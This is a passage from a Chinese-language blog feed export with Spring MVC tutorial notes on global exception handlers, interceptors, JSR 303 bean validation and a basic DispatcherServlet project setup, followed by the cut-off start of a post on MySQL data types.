<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 全局异常处理器</span></span><br><span class="line"><span class="comment"> *  全局异常发生会走此类中的handler!</span></span><br><span class="line"><span class="comment"> *  以下注解二选一，前后端分离一般使用<span class="doctag">@RestControllerAdvic</span></span></span><br><span class="line"><span class="comment"> *    &#x27;<span class="doctag">@ControllerAdvice</span>&#x27; 可以返回逻辑视图、转发和重定向</span></span><br><span class="line"><span class="comment"> *    &#x27;<span class="doctag">@RestControllerAdvice</span>&#x27; 相当于 <span class="doctag">@ResponseBody</span> + <span class="doctag">@ControllerAdvice</span></span></span><br><span class="line"><span class="comment"> *                        直接返回JSON数据，不经过视图解析器，不转发和重定向</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobalExceptionHandler</span> &#123;</span><br><span class="line">    <span class="comment">// 工作流程：</span></span><br><span class="line">    <span class="comment">//    发生异常 ==》进入添加了@ControllerAdvice注解的类 ==》</span></span><br><span class="line">    <span class="comment">//    找到@ExceptionHandle()注解指定的异常与当前异常相同的handler，执行</span></span><br><span class="line">    <span class="comment">// 指定异常可以精准查找或查找父异常！</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExceptionHandler(ArithmeticException.class)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">arithmeticExceptionHandler</span><span class="params">(ArithmeticException e)</span>&#123;</span><br><span class="line">        <span class="comment">// 内部自定义异常处理</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> e.getMessage();</span><br><span class="line">        System.out.println(<span class="string">&quot;message:&quot;</span>+message);</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 空指针异常没有精确对应handler，使用父异常方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(Exception.class)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">exceptionHandler</span><span class="params">(Exception e)</span>&#123;</span><br><span class="line">        <span class="comment">// 内部自定义异常处理</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> e.getMessage();</span><br><span class="line">        System.out.println(<span class="string">&quot;message:&quot;</span>+message);</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="拦截器使用"><a href="#拦截器使用" class="headerlink" title="拦截器使用"></a>拦截器使用</h2><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250109141704.png"></p>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>拦截器可以在接收请求后执行具体的handler方法前进行统一检测，判断是否执行。如某些登录才能使用的功能，就可以通过拦截器判断登录情况再决定是否执行对应的方法。</p>
<p>Springmvc拦截器  VS  javaWeb过滤器：</p>
<ul>
<li>相似点<ul>
<li>拦截：必须先把请求拦住，才能执行后续操作</li>
<li>过滤：拦截器或过滤器存在的意义就是对请求进行统一处理</li>
<li>放行：对请求执行了必要操作后，放请求过去，让它访问原本想要访问的资源</li>
</ul>
</li>
<li>不同点<ul>
<li>工作平台不同<ul>
<li>过滤器工作在 Servlet 容器中</li>
<li>拦截器工作在 SpringMVC 的基础上</li>
</ul>
</li>
<li>拦截的范围<ul>
<li>过滤器：能够拦截到的最大范围是整个 Web 应用</li>
<li>拦截器：能够拦截到的最大范围是整个 SpringMVC 负责的请求</li>
</ul>
</li>
<li>IOC 容器支持<ul>
<li>过滤器：想得到 IOC 容器需要调用专门的工具方法，是间接的</li>
<li>拦截器：它自己就在 IOC 容器中，所以可以直接从 IOC 容器中装配组件，也就是可以直接得到 IOC 容器的支持</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>选择：功能需要如果用 SpringMVC 的拦截器能够实现，就不使用过滤器</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250109140415.png"></p>
<h3 id="拦截器的使用"><a href="#拦截器的使用" class="headerlink" title="拦截器的使用"></a>拦截器的使用</h3><h4 id="1、创建拦截器类"><a href="#1、创建拦截器类" class="headerlink" title="1、创建拦截器类"></a>1、创建拦截器类</h4><p>需要实现<code>@HandlerInterceptor</code>接口，重写三个方法，三个方法可以根据需要编写，可以只编写一个。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 执行handler之前，调用拦截器</span></span><br><span class="line"><span class="comment">     * 一般用于进行编码格式设置，登录保护，权限处理等工作。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request   请求对象，获取参数可以直接通过request.getXXXX()方法，XXX是参数位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response  响应对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> handler   要调用的方法对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> true 放行；false 拦截</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;方法之前&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 执行handler之后，触发的方法，没有拦截机制，handler报错不执行!</span></span><br><span class="line"><span class="comment">     * 只有preHandler()方法返回true才会执行</span></span><br><span class="line"><span class="comment">     * 一般用于结果处理，敏感词汇检查等</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> handler</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> modelAndView 返回的视图和共享域数据对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HandlerInterceptor.<span class="built_in">super</span>.postHandle(request, response, handler, modelAndView);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 整体处理完毕，渲染视图之后执行(最后),一定执行!</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> handler</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ex 如果handler报错</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HandlerInterceptor.<span class="built_in">super</span>.afterCompletion(request, response, handler, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2、修改配置类添加拦截器"><a href="#2、修改配置类添加拦截器" class="headerlink" title="2、修改配置类添加拦截器"></a>2、修改配置类添加拦截器</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.fu&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MVCconfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        <span class="comment">// 方案1：配置全部拦截</span></span><br><span class="line">        <span class="comment">// registry.addInterceptor(new MyInterceptor());</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 方案2：指定地址拦截</span></span><br><span class="line">        <span class="comment">// 可以模糊匹配路径，&#x27;*&#x27;表示任意一层，&#x27;**&#x27;表示任意多层，如/user/*</span></span><br><span class="line">        <span class="comment">// registry.addInterceptor(new MyInterceptor()).addPathPatterns(&quot;/user/data&quot;);</span></span><br><span class="line">		</span><br><span class="line">        <span class="comment">// 方案3：排除地址拦截: 被排除的地址必须本来在被指定范围内</span></span><br><span class="line">        <span class="comment">// 可以模糊匹配路径，&#x27;*&#x27;表示任意一层，&#x27;**&#x27;表示任意多层，如/user/*</span></span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> <span class="title class_">MyInterceptor</span>()).addPathPatterns(<span class="string">&quot;/user/*&quot;</span>).excludePathPatterns(<span class="string">&quot;/user/data1&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>多个拦截器执行顺序</strong></p>
<ol>
<li><p>preHandle()方法：SpringMVC 会把所有拦截器收集到一起，然后按照配置顺序（<code>registry.addInterceptor()</code>)调用各个preHandle() 方法。</p>
</li>
<li><p>postHandle()方法：SpringMVC 会把所有拦截器收集到一起，然后按照配置相反的顺序调用各个postHandle() 方法。</p>
</li>
<li><p>afterCompletion()方法：SpringMVC 会把所有拦截器收集到一起，然后按照配置相反的顺序调用各个 afterCompletion() 方法。</p>
</li>
<li><p>先配置的拦截器的post在后配置拦截器的post和after都执行后才执行</p>
</li>
</ol>
<h2 id="参数校验"><a href="#参数校验" class="headerlink" title="参数校验"></a>参数校验</h2><p>在 Web 应用三层架构体系中，表述层负责接收浏览器提交的数据，业务逻辑层负责数据的处理。为了能够让业务逻辑层基于正确的数据进行处理，我们需要在表述层对数据进行检查，将错误的数据隔绝在业务逻辑层之外。</p>
<p><strong>校验概述</strong><br>JSR303 是 Java 为 Bean 数据合法性校验提供的标准框架，它已经包含在 JavaEE 6.0 标准中。JSR 303 通过在 Bean 属性上标注类似于 @NotNull、@Max 等标准的注解指定校验规则，并通过标准的验证接口对Bean进行验证。</p>
<p><img src="D:\workinenglish\typora_image\image-20250109150740887.png" alt="image-20250109150740887"></p>
<p><img src="D:\workinenglish\typora_image\image-20250109150928783.png" alt="image-20250109150928783"></p>
<p>Spring 在进行数据绑定时，可同时调用校验框架完成数据校验工作。在SpringMVC 中，可直接通过注解驱动 @EnableWebMvc 的方式进行数据校验。Spring 的LocalValidatorFactoryBean 既实现了 Spring 的 Validator 接口，也实现了 JSR 303 的Validator 接口。只要在Spring容器中定义了一个LocalValidatorFactoryBean，即可将其注入到需要数据校验的 Bean中。Spring本身并没有提供JSR 303的实现，所以必须将JSR 303的实现者的jar包放到类路径下。配置 @EnableWebMvc后，SpringMVC 会默认装配好一个 LocalValidatorFactoryBean，通过在处理方法的入参上标注 @Validated 注解即可让 SpringMVC 在完成数据绑定后执行数据校验的工作。</p>
<h4 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h4><h4 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 校验注解实现--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">https://mvnrepository.com/artifact/org.hibernate.validator/hibernate-</span></span><br><span class="line"><span class="comment">validator --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hibernate.validator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hibernate-validator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.0.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">https://mvnrepository.com/artifact/org.hibernate.validator/hibernate-</span></span><br><span class="line"><span class="comment">validator-annotation-processor --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hibernate.validator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hibernate-validator-annotation-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.0.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="校验注解使用"><a href="#校验注解使用" class="headerlink" title="校验注解使用"></a>校验注解使用</h4><p>步骤：</p>
<ol>
<li><p>实体类属性添加校验注解</p>
</li>
<li><p>handler方法声明：handler(<code>@Validated</code>实体类 对象)</p>
<blockquote>
<p>添加<code>@Validated</code>注解校验注解才会生效；</p>
<p>param、JSON数据（JSON参数还要如前文提到的那样添加@RequestBody注解）均可校验。</p>
</blockquote>
</li>
</ol>
<p>实体类设计：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *  name      不为null和空字符串  <span class="doctag">@NotBlank</span></span></span><br><span class="line"><span class="comment">    *  password  长度大于6</span></span><br><span class="line"><span class="comment">    *  age       必须 &gt;= 1</span></span><br><span class="line"><span class="comment">    *  email     邮箱格式字符串</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    *  birthday  过去的时间</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@NotBlank</span></span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line">   <span class="meta">@Length(min=6)</span></span><br><span class="line">   <span class="keyword">private</span> String password;</span><br><span class="line">   <span class="meta">@Min(1)</span></span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">   <span class="meta">@Email</span></span><br><span class="line">   <span class="keyword">private</span> String email;</span><br><span class="line">   <span class="meta">@Past</span></span><br><span class="line">   <span class="keyword">private</span> Date birthday;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>handler方法声明：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="comment">// 接收用户数据，用户有校验注解</span></span><br><span class="line">    <span class="comment">// 使用@Validated使校验注解生效</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 校验不通过，接收错误绑定信息，自定义返回结果</span></span><br><span class="line">    <span class="comment">// 捕捉错误绑定信息：</span></span><br><span class="line">    <span class="comment">//      1. 在方法形参列表中 紧接着 校验对象添加形参 BindingResult result</span></span><br><span class="line">    <span class="comment">//         必须紧跟在校验对象后。</span></span><br><span class="line">    <span class="comment">//      2. 通过BindingResult对象获取绑定错误信息。</span></span><br><span class="line">    <span class="comment">// 假如业务约定参数错误时向前端返回JSON数据&#123;code:400&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;register&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">register</span><span class="params">(<span class="meta">@Validated</span> <span class="meta">@RequestBody</span> User user, BindingResult result)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(result.hasErrors())&#123;</span><br><span class="line">            <span class="comment">// 有出现绑定错误，不再直接返回，而是执行此代码</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            data.put(<span class="string">&quot;code&quot;</span>,<span class="number">400</span>);</span><br><span class="line">            data.put(<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;参数校验异常&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> data;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;user：&quot;</span>+user);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><hr>
<h1 id="实践-1"><a href="#实践-1" class="headerlink" title="实践"></a>实践</h1><h2 id="入门流程实践"><a href="#入门流程实践" class="headerlink" title="入门流程实践"></a>入门流程实践</h2><p>场景：前端向后端请求，后端返回一句话。</p>
<p>配置分析：</p>
<ol>
<li>DispatcherServlet（DS）：设置处理所有请求</li>
<li>HandlerMapping,HandlerAdapter,Handler，需要加入IoC容器，供DS调用</li>
<li>Handler自己在Controller模块声明，需要配置到HandlerMapping中，供DS查找</li>
</ol>
<h3 id="导入依赖-1"><a href="#导入依赖-1" class="headerlink" title="导入依赖"></a>导入依赖</h3><p>创建maven&#x2F;web项目，导入依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">spring.version</span>&gt;</span>6.0.6<span class="tag">&lt;/<span class="name">spring.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet.api</span>&gt;</span>9.1.0<span class="tag">&lt;/<span class="name">servlet.api</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>17<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>17<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        需要：</span></span><br><span class="line"><span class="comment">        web ==》 servlet</span></span><br><span class="line"><span class="comment">        ioc ==》 spring-context</span></span><br><span class="line"><span class="comment">        mvc ==》 spring-webmvc</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- springioc相关依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- web相关依赖 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 在 pom.xml 中引入 Jakarta EE Web API 的依赖 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        在 Spring Web MVC 6 中，Servlet API 迁移到了 Jakarta EE API，因此</span></span><br><span class="line"><span class="comment">        在配置 DispatcherServlet 时需要使用Jakarta EE 提供的相应类库和命名空间。</span></span><br><span class="line"><span class="comment">        错误信息“‘org.springframework.web.servlet.DispatcherServlet’</span></span><br><span class="line"><span class="comment">        is not assignable to ‘javax.servlet.Servlet,jakarta.servlet.Servlet’”</span></span><br><span class="line"><span class="comment">        表明你使用了旧版本的 Servlet API，没有更新到 Jakarta EE 规范。</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jakarta.platform<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jakarta.jakartaee-web-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;servlet.api&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- springwebmvc相关依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="Controller声明"><a href="#Controller声明" class="headerlink" title="Controller声明"></a>Controller声明</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">    <span class="comment">// 对外访问的地址，到handlerMapping注册的注解</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;springmvc/hello&quot;)</span></span><br><span class="line">    <span class="comment">// 表示直接返回字符串给前端，不需要视图解析器</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;HelloController.sayHello&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello SpringMVC&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Spring-MVC核心组件配置类"><a href="#Spring-MVC核心组件配置类" class="headerlink" title="Spring MVC核心组件配置类"></a>Spring MVC核心组件配置类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.fu.controller&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MVCconfig</span> &#123;</span><br><span class="line">    <span class="comment">// HandlerMapping加入IoC</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RequestMappingHandlerMapping <span class="title function_">handlerMapping</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RequestMappingHandlerMapping</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// HandlerAdapter加入IoC</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RequestMappingHandlerAdapter <span class="title function_">handlerAdapter</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RequestMappingHandlerAdapter</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="SpringMVC环境搭建"><a href="#SpringMVC环境搭建" class="headerlink" title="SpringMVC环境搭建"></a>SpringMVC环境搭建</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringMvcInit</span> <span class="keyword">extends</span> <span class="title class_">AbstractAnnotationConfigDispatcherServletInitializer</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 指定service / mapper层的配置类，内部会帮我们创建mapper层的IoC容器</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt;[] getRootConfigClasses() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 指定springmvc的配置类,内部会帮我们创建IoC容器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt;[] getServletConfigClasses() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;MVCconfig.class&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置dispatcherServlet的处理路径!</span></span><br><span class="line"><span class="comment">     * 配置SpringMVC内部自带servlet的访问地址</span></span><br><span class="line"><span class="comment">     * 一般情况下为 / 代表处理所有请求!</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> String[] getServletMappings() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/&quot;</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>Java</category>
        <category>框架与工具</category>
      </categories>
      <tags>
        <tag>SpringMVC</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL数据类型</title>
    <url>/2024/08/05/MySQL%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<p>参考自：<br><a href="https://www.bilibili.com/video/BV1iq4y1u7vj/?p=64&spm_id_from=pageDriver&vd_source=20530c92c1be8bd70e37346e3a5c037a">哔哩哔哩-MySQL数据库-尚硅谷</a><br>数值型数据：整型、浮点型、定点数型（精准表示小数，推荐使用）、位类型<br>字符串型数据：文本字符串型、枚举型、集合型、二进制字符串型<br>JSON型、日期时间型、空间数据型<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240804164842.png" alt="数据类型"><br>常用数据类型如下<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240804164805.png" alt="常用数据类型"></p>
<h3 id="整型-和-位类型"><a href="#整型-和-位类型" class="headerlink" title="整型 和 位类型"></a>整型 和 位类型</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240805174825.png" alt="整型数据"></p>
